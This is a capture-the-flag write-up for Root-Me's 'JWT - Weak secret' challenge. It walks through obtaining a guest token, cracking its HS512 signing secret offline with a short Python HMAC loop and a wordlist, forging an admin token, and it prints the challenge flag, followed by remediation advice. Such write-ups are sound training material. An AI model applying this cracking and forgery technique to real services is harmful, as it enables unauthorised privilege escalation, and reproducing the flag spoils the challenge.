# Root-Me — Web-Server: "JWT - Weak secret" (ch59)

**Target:** http://challenge01.root-me.org/web-serveur/ch59/
**Author:** Jrmbt · **Points:** 25 · **API:** "Use the force"

## Result

```
FLAG / VALIDATION PASSWORD: PleaseUseAStrongSecretNextTime
```

## Step 1 — Reconnaissance

`GET /` redirects (301) to `/hello`, which describes the whole game:

```json
{"message": "Let's play a small game, I bet you cannot access to my super secret admin
section. Make a GET request to /token and use the token you'll get to try to access
/admin with a POST request."}
```

`POST /admin` without credentials tells you the auth scheme:

```json
{"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
```

## Step 2 — Obtain a token

```bash
curl -s http://challenge01.root-me.org/web-serveur/ch59/token
```

```json
{"Here is your token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"}
```

Decoding the two segments:

| Segment | Content |
|---|---|
| Header | `{"typ":"JWT","alg":"HS512"}` |
| Payload | `{"role":"guest"}` |

So authorisation is carried entirely in a **self-asserted `role` claim**, and the token
is a symmetric HMAC (HS512) — meaning one shared secret both signs and verifies.

Using the guest token on `/admin` returns a taunt that is also a confession:

```json
{"message": "I was right, you are not able to break my super crypto!
 I use HS512 so no need to have a strong secret!"}
```

That last sentence is the vulnerability: **HS512 is a strong algorithm with a weak key.**

## Step 3 — Crack the signing secret

No `hashcat`/`john`/`jwt_tool` was available, so I wrote a small offline cracker —
`crack_jwt.py` — that recomputes HMAC over `header.payload` for each wordlist entry and
compares against the signature (also self-detects the algorithm from the signature length):

```python
signing_input = f"{parts[0]}.{parts[1]}".encode()
target = b64url_decode(parts[2])
if hmac.new(word, signing_input, hashlib.sha512).digest() == target:
    print("FOUND:", word)
```

Wordlists were fetched from SecLists (`rockyou-75.txt` proved sufficient):

```bash
python crack_jwt.py "$TOKEN" rockyou-75.txt
# [+] SECRET FOUND after 18735 candidates: 'lol'
```

**Secret: `lol`** — a 3-character dictionary word.

## Step 4 — Forge an admin token

With the secret known, re-sign a payload claiming `role: admin`. `forge_jwt.py` does this:

```bash
python forge_jwt.py '{"typ":"JWT","alg":"HS512"}' '{"role":"admin"}' 'lol'
```

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
```

Note the signature is computed by the *server's* own verification algorithm — this is a
**forgery**, not a modification. Nothing is brute-forced online.

## Step 5 — Verify

| Request | Response |
|---|---|
| `POST /admin` with the **original guest** token | `"I was right, you are not able to break my super crypto!"` |
| `POST /admin` with the **forged admin** token | `"Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime"` |

The paired control matters: the guest token fails, so the success is attributable to the
forged `role` claim, not to some endpoint that always returns the flag.

## Remediation

- **Use a long, high-entropy secret** (≥ 256 bits from a CSPRNG, e.g.
  `openssl rand -base64 64`). Algorithm strength is irrelevant if the key is guessable —
  the whole point of this challenge.
- Better still, **migrate to asymmetric signing (RS256/ES256)** for anything where the
  verifier and issuer are not the same trust domain, so the verification key cannot be
  used to mint tokens.
- **Never trust claims for authorisation without server-side validation.** `role` came
  straight from the token; the server should re-check the subject's privileges against a
  store it controls.
- Add `exp`/`iat`/`nbf` and enforce them, plus an `aud`/`iss` check, to limit replay.
- Rotate the secret if it has ever been weak, and keep it out of source control.

## Notes on the environment

Reachability and exploitation confirmed from Windows Git Bash via the sandbox HTTP proxy.
`hashcat`/`john` were unavailable, so cracking was done with a stdlib-only Python script
(`crack_jwt.py`) — roughly 20k HS512 candidates/second, ample for a dictionary attack.
